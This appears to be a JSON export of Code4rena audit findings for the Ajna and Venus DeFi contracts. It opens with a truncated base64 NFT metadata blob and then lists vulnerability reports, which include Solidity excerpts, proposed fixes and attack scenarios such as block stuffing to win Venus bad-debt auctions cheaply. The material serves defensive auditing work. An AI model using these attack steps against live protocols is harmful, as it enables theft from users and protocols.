pdHM9InVzZXJTcGFjZU9uVXNlIj48c3RvcCBzdG9wLWNvbG9yPSIjQjFBNkNFIi8+PHN0b3Agb2Zmc2V0PSIwLjUwNTIwOCIgc3RvcC1jb2xvcj0iI0I0NUNENiIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iIzY0MkREMiIvPjwvbGluZWFyR3JhZGllbnQ+PGNsaXBQYXRoIGlkPSJjbGlwMF8xMTVfNTEiPjxyZWN0IHdpZHRoPSI1MTIiIGhlaWdodD0iNTEyIiByeD0iMzIiIGZpbGw9IndoaXRlIi8+PC9jbGlwUGF0aD48L2RlZnM+PGc+PHRleHQgdGV4dC1hbmNob3I9InN0YXJ0IiB4PSIzMnB4IiB5PSI0NnB4IiBmaWxsPSJ3aGl0ZSIgZm9udC1mYW1pbHk9IidhbmRhbGUgbW9ubycsICdDb3VyaWVyIE5ldycsIG1vbm9zcGFjZSIgZm9udC1zaXplPSIxOHB4Ij5DL1E8L3RleHQ+PC9nPjxnIHN0eWxlPSJ0cmFuc2Zvcm06dHJhbnNsYXRlKDMycHgsIDQ1NnB4KSI+PHJlY3Qgd2lkdGg9IjkycHgiIGhlaWdodD0iMjZweCIgcng9IjhweCIgcnk9IjhweCIgZmlsbD0icmdiYSgwLDAsMCwwLjgpIi8+PHRleHQgeD0iMTJweCIgeT0iMTdweCIgZmlsbD0idmlvbGV0IiBmb250LWZhbWlseT0iJ2FuZGFsZSBtb25vJywgJ0NvdXJpZXIgTmV3JywgbW9ub3NwYWNlIiBmb250LXNpemU9IjEycHgiPjx0c3BhbiBmaWxsPSJyZ2JhKDI1NSwyNTUsMjU1LDAuNikiPklEOiA8L3RzcGFuPjE8L3RleHQ+PC9nPjwvc3ZnPiIsICJvd25lciI6IjB4MTZjY2IzMWQyNGM1Nzg1NDQxMTNlNmNjZWViMGYzYzBjMWEyN2Y5MyJ9 ``` after decode base64 to json: ```json {\"name\":\"Ajna Token #1\", \"description\":\"Ajna Positions NFT-V1\", \"image\":\"<svg fill=\"none\" viewBox=\"0 0 512 512\" xmlns=\"http://www.w3.org/2000/svg\"><g clip-path=\"url(#clip0_115_51)\"><rect width=\"512\" height=\"512\" rx=\"32\" fill=\"url(#paint0_linear_115_51)\"/><rect width=\"512\" height=\"512\" rx=\"32\" fill=\"black\" fill-opacity=\"0.5\"/><g filter=\"url(#filter0_f_115_51)\"><ellipse cx=\"374\" cy=\"390.5\" rx=\"122\" ry=\"121.5\" fill=\"#B45CD6\"/><circle cx=\"157\" cy=\"315\" r=\"122\" fill=\"#37FCFB\"/><ellipse cx=\"137.783\" cy=\"137.5\" rx=\"121.783\" ry=\"121.5\" fill=\"#642DD2\"/></g><rect opacity=\"0.5\" x=\"16.5\" y=\"16.5\" width=\"479\" height=\"479\" rx=\"23.5\" fill=\"black\" stroke=\"white\"/><circle cx=\"256\" cy=\"256\" r=\"228.5\" stroke=\"white\"/><circle cx=\"256\" cy=\"256\" r=\"219.5\" stroke=\"white\"/><path d=\"M410.273 467C410.204 467 410.139 466.974 410.078 466.922C410.026 466.861 410 466.796 410 466.727C410 466.684 410.004 466.645 410.013 466.61L413.068 458.264C413.094 458.169 413.146 458.086 413.224 458.017C413.311 457.939 413.428 457.9 413.575 457.9H415.499C415.646 457.9 415.759 457.939 415.837 458.017C415.924 458.086 415.98 458.169 416.006 458.264L419.048 466.61C419.065 466.645 419.074 466.684 419.074 466.727C419.074 466.796 419.044 466.861 418.983 466.922C418.931 466.974 418.866 467 418.788 467H417.189C417.059 467 416.959 466.97 416.89 466.909C416.829 466.84 416.79 466.779 416.773 466.727L416.266 465.401H412.795L412.301 466.727C412.284 466.779 412.245 466.84 412.184 466.909C412.123 466.97 412.019 467 411.872 467H410.273ZM413.328 463.529H415.746L414.524 460.097L413.328 463.529Z\" fill=\"white\"/><path d=\"M431.118 467.13C430.624 467.13 430.151 467.069 429.701 466.948C429.259 466.818 428.864 466.627 428.518 466.376C428.171 466.125 427.894 465.813 427.686 465.44C427.486 465.067 427.378 464.634 427.361 464.14C427.361 464.062 427.387 463.997 427.439 463.945C427.491 463.884 427.56 463.854 427.647 463.854H429.402C429.523 463.854 429.614 463.884 429.675 463.945C429.744 464.006 429.8 464.097 429.844 464.218C429.887 464.461 429.969 464.66 430.091 464.816C430.212 464.963 430.364 465.076 430.546 465.154C430.736 465.223 430.949 465.258 431.183 465.258C431.616 465.258 431.95 465.119 432.184 464.842C432.418 464.556 432.535 464.14 432.535 463.594V459.837H428.323C428.236 459.837 428.158 459.807 428.089 459.746C428.028 459.685 427.998 459.607 427.998 459.512V458.225C427.998 458.13 428.028 458.052 428.089 457.991C428.158 457.93 428.236 457.9 428.323 457.9H434.615C434.71 457.9 434.788 457.93 434.849 457.991C434.918 458.052 434.953 458.13 434.953 458.225V463.659C434.953 464.413 434.788 465.05 434.459 465.57C434.129 466.081 433.679 466.471 433.107 466.74C432.535 467 431.872 467.13 431.118 467.13Z\" fill=\"white\"/><path d=\"M445.006 467C444.91 467 444.832 466.97 444.772 466.909C444.711 466.848 444.681 4"}, {"title": " `PositionManager` & `PermitERC721` Failure to comply with the EIP-4494", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/141", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-13"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L42 https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/PermitERC721.sol#L77 https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/PermitERC721.sol#L13 https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L57   # Vulnerability details   ## Impact The contract `PositionManager.sol` inherits from `PermitERC721.sol`, but both contracts incorrectly implement the `EIP-4494` standard, which is an important part of the contract. This leads to the following issues:  - `PositionManager` & `PermitERC721` are not `EIP-4494` compliant - Automatic tools will not be able to determine that this contract has a `permit` for `ERC721` - Third-party contracts will not be able to determine that this is `EIP-4494` - Inability to correctly track which `nonces` are currently relevant, leading to the creation of invalid signatures/signatures for the future - No support for compact signatures   ## Proof of Concept According to the specifications of the standard [EIP-4494](https://eips.ethereum.org/EIPS/eip-4494), the following violations were found:  1. ```EIP-4494``` requires the implementation of `IERC165` and the indication of support for the interface ```0x5604e225```, **which is not implemented**  2. `EIP-4494` requires the presence of the function ```function nonces(uint256 tokenId) external view returns(uint256);``` **which is missing**  3. `EIP-4494` requires the function ```function permit(address spender, uint256 tokenId, uint256 deadline, bytes memory sig) external;```, **which is incorrectly declared** as ```javascript File: 2023-05-ajna\\ajna-core\\src\\base\\PermitERC721.sol  77:     function permit( 78:         address spender_, uint256 tokenId_, uint256 deadline_, uint8 v_, bytes32 r_, bytes32 s_ 79:     ) external {  ```  ## Tools Used * Manual review * Foundry * https://eips.ethereum.org/EIPS/eip-4494  ## Recommended Mitigation Steps * Correct the identified non-compliance issues so that the contracts meet the standard * Or remove references to the standard and provide a reference to the Uniswap V3 implementation      ## Assessed type  Other"}, {"title": "`PositionManager.moveLiquidity` could revert due to underflow", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/99", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-14"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L320   # Vulnerability details  ## Impact `Position.moveLiquidity` can potentially revert due to underflow  ## Proof of Concept [PositionManager.sol#L320](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L320) ```solidity function moveLiquidity(     MoveLiquidityParams calldata params_ ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {     Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];      MoveLiquidityLocalVars memory vars;     vars.depositTime = fromPosition.depositTime;      // handle the case where owner attempts to move liquidity after they've already done so     if (vars.depositTime == 0) revert RemovePositionFailed();      // ensure bucketDeposit accounts for accrued interest     IPool(params_.pool).updateInterest();      // retrieve info of bucket from which liquidity is moved       (         vars.bucketLP,         vars.bucketCollateral,         vars.bankruptcyTime,         vars.bucketDeposit,     ) = IPool(params_.pool).bucketInfo(params_.fromIndex);      // check that bucket hasn't gone bankrupt since memorialization     if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();      // calculate the max amount of quote tokens that can be moved, given the tracked LP     vars.maxQuote = _lpToQuoteToken(         vars.bucketLP,         vars.bucketCollateral,         vars.bucketDeposit,         fromPosition.lps,         vars.bucketDeposit,         _priceAt(params_.fromIndex)     );      EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];      // remove bucket index from which liquidity is moved from tracked positions     if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();      // update bucket set at which a position has liquidity     // slither-disable-next-line unused-return     positionIndex.add(params_.toIndex);      // move quote tokens in pool     (         vars.lpbAmountFrom,         vars.lpbAmountTo,     ) = IPool(params_.pool).moveQuoteToken(         vars.maxQuote,         params_.fromIndex,         params_.toIndex,         params_.expiry     );      Position storage toPosition = positions[params_.tokenId][params_.toIndex];      // update position LP state     fromPosition.lps -= vars.lpbAmountFrom;     toPosition.lps   += vars.lpbAmountTo;     // update position deposit time to the from bucket deposit time     toPosition.depositTime = vars.depositTime;      emit MoveLiquidity(         ownerOf(params_.tokenId),         params_.tokenId,         params_.fromIndex,         params_.toIndex,         vars.lpbAmountFrom,         vars.lpbAmountTo     ); } ```  If lp position is worth more than when at deposit time based on amount of quote token moved which could likely be the case due to interest accrued or simply from exchange rates favoring quote token, `moveLiquidity` could revert due to underflow as `vars.lpbAmountFrom` could be greater than `fromPosition.lps` (i.e. `vars.lpbAmountFrom > fromPosition.lps`)  Since call to `Position.moveLiquidity()` is supposed to move all lp positions attached to associated NFT within a bucket, we can simply delete the `fromPosition` mapping to remove bucket index at which a position has moved liquidity to prevent potential cases where `Position.moveLiquidity()` could revert due to underflow in this line: ```solidity fromPosition.lps -= vars.lpbAmountFrom; ```  ## Tools Used Manual Analysis  ## Recommendation LP tracked by position manager at bucket index should be deleted similar to `redeemPositions`, if not `Position.moveLiquidity` can likely underflow  ```solidity function moveLiquidity(     MoveLiquidityParams calldata params_ ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {     ...      // update position LP state     fromPosition.lps -= vars.lpbAmountFrom;     toPosition.lps   += vars.lpbAmountTo;     // update position deposit time to the from bucket deposit time     toPosition.depositTime = vars.depositTime; ++  delete fromPosition        emit MoveLiquidity(         ownerOf(params_.tokenId),         params_.tokenId,         params_.fromIndex,         params_.toIndex,         vars.lpbAmountFrom,         vars.lpbAmountTo     ); } ```   ## Assessed type  Under/Overflow"}, {"title": "critical function typo", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/69", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-49"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L352   # Vulnerability details  ## Impact misspelling a function name can lead to compilation or runtime errors. In this example, the function name should be \"RedeemPositions\", but it is misspelled as \"reedemPositions\", which means that attempting to call this function using the correct function name will result in a compilation or runtime error due to the function not being found. Therefore, the misspelling may cause the caller to be unable to use the contract functionality correctly  ## Proof of Concept https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L352  Misspelling  ## Tools Used Manual review  ## Recommended Mitigation Steps change \"reedemPositions\" to \"RedeemPositions\"   ## Assessed type  Other"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/538", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "edited-by-warden", "G-04"], "target": "2023-05-venus-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-venus-findings/blob/main/data/JCN-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/537", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-05"], "target": "2023-05-venus-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-venus-findings/blob/main/data/naman1778-G.md)."}, {"title": "Malicious actor can win auction unfavorably to the protocol by block stuffing", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/525", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-05-venus-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Shortfall/Shortfall.sol#L158-L202 https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Shortfall/Shortfall.sol#L467-L470 https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Shortfall/Shortfall.sol#L213   # Vulnerability details  ## Vulnerability Details  When protocol\u2019s bad debt is auctioned off with 10% incentive at the beginning. A user who gives the best bid, wins. The auction ends when at least one account placed a bid, and current block number is bigger than `nextBidderBlockLimit`:  ```jsx function closeAuction(address comptroller) external nonReentrant {         Auction storage auction = auctions[comptroller];          require(_isStarted(auction), \"no on-going auction\");         require(             block.number > auction.highestBidBlock + nextBidderBlockLimit && auction.highestBidder != address(0),             \"waiting for next bidder. cannot close auction\"         ); ```  `nextBidderBlockLimit` is set to 10 in the initializer, which means that other users have only 30 seconds to place better bid. Now, this is a serious problem, because stuffing whole block with dummy transactions is very cheap on Binance Smart Chain. According to [https://www.cryptoneur.xyz/en/gas-fees-calculator](https://www.cryptoneur.xyz/en/gas-fees-calculator) 15M gas - whole block - costs 14$~15$ on BSC. This makes a malicious user occasion to cheaply prohibit other users to overbid them, winning the auction at the least favorable price for the protocol. Because BSC is centralized blockchain, there are no private mempools and bribes directly to the miners (like in FlashBots), hence other users are very limited concerning the prohibitive actions.  ## Impact  The protocol overpays for bad debt, loosing value  ## Proof of Concept  1. Pool gathered 100\u2019000$ bad debt and it\u2019s eligible for auction 2. A malicious user frontruns others and places first bid with the least possible amount (bad debt + 10% incentive). 3. The user sends dozens of dummy transactions with increased gas price, only to fill up whole block space for 11 blocks 4. At the end, the user sends a transaction to close auction, getting the bad debt + 10% incentive.   ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  There are at least three options to resolve this issue:  1. make he bidding window much higher at the beginning, like 1000 blocks 2. make bidding window very high at the beginning, decreasing it, the more attractive the new bid is 3. make bidding window dependent on the money at stake, to disincentivize block stuffing   ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/514", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-10"], "target": "2023-05-venus-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-venus-findings/blob/main/data/brgltd-Q.md)."}, {"title": "`MaxLoopLimitHelper._ensureMaxLoop()` is validating the wrong input in `Comptroller.setActionsPaused()`", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/498", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-05-venus-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Comptroller.sol#L885-L902 https://github.com/code-423n4/2023-05-venus/blob/main/contracts/MaxLoopsLimitHelper.sol#L25-L32 https://github.com/code-423n4/2023-05-venus/blob/main/contracts/MaxLoopsLimitHelper.sol#L39-L43   # Vulnerability details  ## Proof of Concept  The protocol is using `MaxLoopLimitHelper._ensureMaxLoop()` throughout various functions to prevent DOS. However, `Comptroller.setActionsPaused()` contains a nested loop with a time complexity of `marketsList.length * actionsList.length`, while `_ensureMaxLoop()` is only validating `marketsList.length`.  ``` uint256 marketsCount = marketsList.length; uint256 actionsCount = actionsList.length;  _ensureMaxLoops(marketsCount);  for (uint256 marketIdx; marketIdx < marketsCount; ++marketIdx) {     for (uint256 actionIdx; actionIdx < actionsCount; ++actionIdx) {         _setActionPaused(address(marketsList[marketIdx]), actionsList[actionIdx], paused);     } } ```  https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Comptroller.sol#L885-L902  If `x` is the number of tokens and `y` is the number of actions, `_ensureMaxLoop()` should validate `x * y` and not only `x`.  1. For demonstration, assuming `.MaxLoopLimitHelper_ensureMaxLoop()` contains a limit of 200  2. 100 tokens are being passed to `.Comptroller.setActionsPaused()`   3. 5 actions are being paused (there are 9 possible actions) 4. `MaxLoopLimitHelper._ensureMaxLoop()` will incorrectly pass assuming `100 (iterations) < 200 (limit)`, however it should revert since `500 (iterations) > 200 (limit)`  https://github.com/code-423n4/2023-05-venus/blob/main/contracts/MaxLoopsLimitHelper.sol#L25-L32  https://github.com/code-423n4/2023-05-venus/blob/main/contracts/MaxLoopsLimitHelper.sol#L39-L43  https://github.com/code-423n4/2023-05-venus/blob/main/contracts/ComptrollerStorage.sol#L44-L54  ## Impact  Letting `Comptroller.setActionsPaused()` consume all gas and revert will be more costly than failing early. Also, failing with the custom error `MaxLoopsLimitExceeded(maxLoopsLimit, len)` is the expected behavior. Is is possible that failing directly instead of through `MaxLoopLimitHelper._ensureMaxLoop()` will damage monitoring/frontend tooling, since `MaxLoopLimitHelper._ensureMaxLoop()` will incorrectly pass the input data and it won't trigger the custom error.  The usage of `MaxLoopLimitHelper._ensureMaxLoop()` indicates failing early against DOS is important for the project. Loop validation will have undefined behavior in `Comptroller.setActionsPaused()`. Pausing actions will likely be done in times of market instability, therefore the functions used for pausing should have a stable and pre-defined behavior.  ## Tools Used  Manual review.  ## Recommended Mitigation Steps  Replace `marketsCount` with `marketsCount * actionsCount` in `Comptroller.setActionsPaused()` when calling `MaxLoopLimitHelper._ensureMaxLoops()`, e.g.  ```diff diff --git a/Comptroller.sol.orig b/Comptroller.sol index 1559520..0c29eb6 100644 --- a/Comptroller.sol.orig +++ b/Comptroller.sol @@ -892,7 +892,7 @@ contract Comptroller is          uint256 marketsCount = marketsList.length;          uint256 actionsCount = actionsList.length;  -        _ensureMaxLoops(marketsCount); +        _ensureMaxLoops(marketsCount * actionsCount);           for (uint256 marketIdx; marketIdx < marketsCount; ++marketIdx) {              for (uint256 actionIdx; actionIdx < actionsCount; ++actionIdx) { ```    ## Assessed type  Invalid Validation"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/487", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-15"], "target": "2023-05-venus-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-venus-findings/blob/main/data/Infect3d-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/484", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-10"], "target": "2023-05-venus-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-venus-findings/blob/main/data/Aymen0909-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/460", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-19"], "target": "2023-05-venus-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-venus-findings/blob/main/data/berlin-101-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/369", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-29"], "target": "2023-05-venus-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-venus-findings/blob/main/data/YoungWolves-Q.md)."}, {"title": "_ensureMaxLoops causes liquidateAccount to fail in certain condition", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/327", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-05-venus-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-venus/blob/8be784ed9752b80e6f1b8b781e2e6251748d0d7e/contracts/Comptroller.sol#L667   # Vulnerability details  ## Impact The function **_ensureMaxLoops** reverts if the iteration count exceeds the **maxLoopsLimit**. However, the limitation imposed by **maxLoopsLimit** hinders the functioning of **liquidateAccount** under certain conditions, as **orderCount** needs to reach twice the market count (which is also constrained by the **maxLoopsLimit**) in extreme cases.  ## Proof of Concept Suppose **maxLoopsLimit** is set to **16** and currently **12** markets has been added, which is allowed by **_ensureMaxLoops** in function **_addMarket**:      allMarkets.push(VToken(vToken));     marketsCount = allMarkets.length;     _ensureMaxLoops(marketsCount); Then, Alice enters all the **12** markets by depositing and borrowing simultaneously, which is also allowed by **_ensureMaxLoops** in function **enterMarkets**:      uint256 len = vTokens.length;     uint256 accountAssetsLen = accountAssets[msg.sender].length;     _ensureMaxLoops(accountAssetsLen + len); To illustrate, assume these **12** coins are all stablecoin with an equal value. Let's call them USDA, USDB, USDC,..., USDL. Alice deposits 20 USDA, 1.1USDB, 1.1USDC,..., 1.1USDL, worth 32.1USD in total, then she borrows 2USDA, 2USDB, 2USDC,..., 2USDL, worth 24 USD in total. Unluckily, USDA depegs to 0.6USD, Alice's deposit value drop to 24.1USD, which is below the liquidation threshold (also below the minLiquidatableCollateral). However, nobody can liquidate Alice's account by calling **liquidateAccount**, because the least possible **orderCount** is **23**, which exceeds **maxLoopsLimit**.  Let's take a closer look at **LiquidationOrder**:      struct LiquidationOrder {            VToken vTokenCollateral;            VToken vTokenBorrowed;            uint256 repayAmount;     } In this case, liquidator cannot perfectly match **vTokenCollateral** with **vTokenBorrowed** one-to-one. Because the value of collateral and debt is not equal, more than one order is needed to liquidate each asset. To generalize, if asset count is **n**, in the worst case, **2n-1** orders are needed for a complete liquidation (not hard to prove).  ## Tools Used Manual  ## Recommended Mitigation Steps     _ensureMaxLoops(ordersCount / 2);    ## Assessed type  Loop"}, {"title": "Bad Debt in PoolLens.sol#getPoolBadDebt() is not calculated correctly in USD", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/316", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-05-venus-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-venus/blob/8be784ed9752b80e6f1b8b781e2e6251748d0d7e/contracts/Lens/PoolLens.sol#L248   # Vulnerability details  ## Proof of Concept  In PoolLens.sol#getPoolBadDebt(), bad debt is calculated as such:   ```             badDebt.badDebtUsd =                 VToken(address(markets[i])).badDebt() *                 priceOracle.getUnderlyingPrice(address(markets[i]));             badDebtSummary.badDebts[i] = badDebt;             totalBadDebtUsd = totalBadDebtUsd + badDebt.badDebtUsd; ```  In Shortfall.sol#_startAuction(), bad debt is calculated as such:  ```         uint256[] memory marketsDebt = new uint256[](marketsCount);         auction.markets = new VToken[](marketsCount);          for (uint256 i; i < marketsCount; ++i) {             uint256 marketBadDebt = vTokens[i].badDebt();              priceOracle.updatePrice(address(vTokens[i]));             uint256 usdValue = (priceOracle.getUnderlyingPrice(address(vTokens[i])) * marketBadDebt) / 1e18;              poolBadDebt = poolBadDebt + usdValue; ```  Focus on the line with the priceOracle.getUnderlyingPrice. In PoolLens.sol#getPoolBadDebt, badDebt in USD is calculated by multiplying the bad debt of the VToken market by the underlying price. However, in Shortfall, badDebt in USD is calculated by the bad debt of the VToken market by the underlying price and divided by 1e18.   The PoolLens#getPoolBadDebt() function forgot to divide the debt in usd by 1e18.  This is what the function is actually counting:   Let's say that the VToken market has a badDebt of 1.3 ETH (1e18 ETH). The pool intends to calculate 1.3 ETH in terms of USD, so it calls the oracle to determine the price of ETH. Let's say the price of ETH is 1500 USD. The total pool debt should be 1.3 * 1500 = 1950 USD. In decimal calculation, the pool debt should be 1.3e18 * 1500e18 (if oracle returns in 18 decimal places) / 1e18 = 1950e18.  ## Impact  The badDebt in USD in PoolLens.sol#getPoolBadDebt() will be massively inflated.  ## Tools Used  VSCode  ## Recommended Mitigation Steps  Normalize the decimals of the bad debt calculation in getPoolBadDebt().  ```             badDebt.badDebtUsd =                 VToken(address(markets[i])).badDebt() * +               priceOracle.getUnderlyingPrice(address(markets[i])) / 1e18;             badDebtSummary.badDebts[i] = badDebt;             totalBadDebtUsd = totalBadDebtUsd + badDebt.badDebtUsd; ```   ## Assessed type  Decimal"}, {"title": "Potential Unjust Liquidation After Exiting Market ", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/309", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-05-venus-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-venus/blob/8be784ed9752b80e6f1b8b781e2e6251748d0d7e/contracts/Comptroller.sol#L424-L526   # Vulnerability details  ## Impact  Users might face unjust liquidation of their assets even after exiting a particular market. This could lead to potential financial losses for users, and it might undermine the trust and reputation of the platform.   ## Proof of Concept  Consider a user with the following financial status:  - Collateral: 1 Bitcoin (BTC), worth `$30,000`, and 10,000 USDT, worth `$10,000`. - Outstanding loan: 1 Ethereum (ETH), worth $3,000.  1. The user decides to remove their risk from BTC volatility and exits the BTC market. As per the protocol's rules, exiting the market should remove BTC from their collateral.  2. Following the user's exit from the BTC market, a sharp rise in the ETH price occurs, and it surpasses $10,000.  3. Due to the increase in ETH price, the system identifies that the user's collateral (now only 10,000 USDT) is insufficient to cover their loan, leading to an insufficient collateralization rate.  4. Despite the user's exit from the BTC market, the system still triggers a liquidation process to liquidating BTC as collateral.   In reality, if the BTC was still part of the user's collateral, the total collateral value would have been $40,000 ($30,000 from BTC and $10,000 from USDT). This total value would be sufficient to cover the ETH loan even with the price surge of ETH. Therefore, the user should not have faced liquidation.  This can be traced back to the missing membership check in `preLiquidateHook` function which does not consider if the user has exited the market or not.  https://github.com/code-423n4/2023-05-venus/blob/8be784ed9752b80e6f1b8b781e2e6251748d0d7e/contracts/Comptroller.sol#L424-L526  ```solidity=424 function preLiquidateHook(         address vTokenBorrowed,         address vTokenCollateral,         address borrower,         uint256 repayAmount,         bool skipLiquidityCheck     ) external override {         // Pause Action.LIQUIDATE on BORROWED TOKEN to prevent liquidating it.         // If we want to pause liquidating to vTokenCollateral, we should pause         // Action.SEIZE on it         _checkActionPauseState(vTokenBorrowed, Action.LIQUIDATE);          oracle.updatePrice(vTokenBorrowed);         oracle.updatePrice(vTokenCollateral);          if (!markets[vTokenBorrowed].isListed) {             revert MarketNotListed(address(vTokenBorrowed));         }         if (!markets[vTokenCollateral].isListed) {             revert MarketNotListed(address(vTokenCollateral));         }          uint256 borrowBalance = VToken(vTokenBorrowed).borrowBalanceStored(borrower);          /* Allow accounts to be liquidated if the market is deprecated or it is a forced liquidation */         if (skipLiquidityCheck || isDeprecated(VToken(vTokenBorrowed))) {             if (repayAmount > borrowBalance) {                 revert TooMuchRepay();             }             return;         }          /* The borrower must have shortfall and collateral > threshold in order to be liquidatable */         AccountLiquiditySnapshot memory snapshot = _getCurrentLiquiditySnapshot(borrower, _getLiquidationThreshold);          if (snapshot.totalCollateral <= minLiquidatableCollateral) {             /* The liquidator should use either liquidateAccount or healAccount */             revert MinimalCollateralViolated(minLiquidatableCollateral, snapshot.totalCollateral);         }          if (snapshot.shortfall == 0) {             revert InsufficientShortfall();         }          /* The liquidator may not repay more than what is allowed by the closeFactor */         uint256 maxClose = mul_ScalarTruncate(Exp({ mantissa: closeFactorMantissa }), borrowBalance);         if (repayAmount > maxClose) {             revert TooMuchRepay();         }     }      /**      * @notice Checks if the seizing of assets should be allowed to occur      * @param vTokenCollateral Asset which was used as collateral and will be seized      * @param seizerContract Contract that tries to seize the asset (either borrowed vToken or Comptroller)      * @param liquidator The address repaying the borrow and seizing the collateral      * @param borrower The address of the borrower      * @custom:error ActionPaused error is thrown if seizing this type of collateral is paused      * @custom:error MarketNotListed error is thrown if either collateral or borrowed token is not listed      * @custom:error ComptrollerMismatch error is when seizer contract or seized asset belong to different pools      * @custom:access Not restricted      */     function preSeizeHook(         address vTokenCollateral,         address seizerContract,         address liquidator,         address borrower     ) external override {         // Pause Action.SEIZE on COLLATERAL to prevent seizing it.         // If we want to pause liquidating vTokenBorrowed, we should pause         // Action.LIQUIDATE on it         _checkActionPauseState(vTokenCollateral, Action.SEIZE);          if (!markets[vTokenCollateral].isListed) {             revert MarketNotListed(vTokenCollateral);         }          if (seizerContract == address(this)) {             // If Comptroller is the seizer, just check if collateral's comptroller             // is equal to the current address             if (address(VToken(vTokenCollateral).comptroller()) != address(this)) {                 revert ComptrollerMismatch();             }         } else {             // If the seizer is not the Comptroller, check that the seizer is a             // listed market, and that the markets' comptrollers match             if (!markets[seizerContract].isListed) {                 revert MarketNotListed(seizerContract);             }             if (VToken(vTokenCollateral).comptroller() != VToken(seizerContract).comptroller()) {                 revert ComptrollerMismatch();             }         }          // Keep the flywheel moving         uint256 rewardDistributorsCount = rewardsDistributors.length;          for (uint256 i; i < rewardDistributorsCount; ++i) {             rewardsDistributors[i].updateRewardTokenSupplyIndex(vTokenCollateral);             rewardsDistributors[i].distributeSupplierRewardToken(vTokenCollateral, borrower);             rewardsDistributors[i].distributeSupplierRewardToken(vTokenCollateral, liquidator);         }     } ```   In essence, the user is punished for market volatility even after they have taken steps to protect themselves (by exiting the BTC market).  ## Tools Used  